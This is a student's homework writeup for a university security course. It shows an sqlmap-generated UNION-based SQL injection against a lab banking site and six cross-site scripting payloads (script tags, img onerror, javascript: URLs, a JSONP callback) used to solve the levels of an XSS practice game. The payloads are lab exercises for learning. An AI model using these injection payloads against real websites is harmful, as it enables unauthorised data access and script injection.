# Crypto II Writeup

Name: Alex Bloch
Section: 0101

I pledge on my honor that I have not given or received any unauthorized
assistance on this assignment or examination.

Digital acknowledgement: Alex Bloch
## Assignment Writeup

### Part 1 (40 Pts)
Presumably this means 'Do an SQL injection'. Lecture notes don't seem to be helpful, so following this guide: https://security.stackexchange.com/questions/173459/sql-injection-how-to-find-urls-to-attack-to
I typed in http://1337bank.money:5000/item?id=0%20SELECT%20*%20FROM%20item%20category=1 and it said ERROR: ATTEMPTED SQL INJECTION DETECTED So I assume this is it?
I ran sqlmap, which gave me id=0' UNION ALL SELECT NULL,NULL,NULL,CONCAT(CONCAT('qjjqq','WazkonSMvyznWrcBDUfYMgEkqxceaBtJMFUyRSmX'),'qvkpq'),NULL-- SZhE . 
Putting this in the URL, I get a page with a broke image and 'None' for the name and price, so I assumed I did this right. I've spent 2 hours on this already so I hope this is right.
 This is the only homework assignment in my 8 semesters in UMD CS that doesn't have a question or give any requirements, so I'm assuming that this means I can whatever and it'll count as an answer.
### Part 2 (60 Pts)

1: doing a js script: <script>alert('yo')</script>
2: Using hints to get <img src="http://google.com" onerror="javascript:alert('yo')"/>
3: escaped the url and added an onerror="alert('yo')"
4: escaping the textbox using  ');alert('fds
5: changed the signup?next url to signup?next=javascript:alert(2)
6: Using the hints, but changing foo to alert gets me: https://xss-game.appspot.com/level6/frame#//www.google.com/jsapi?callback=alert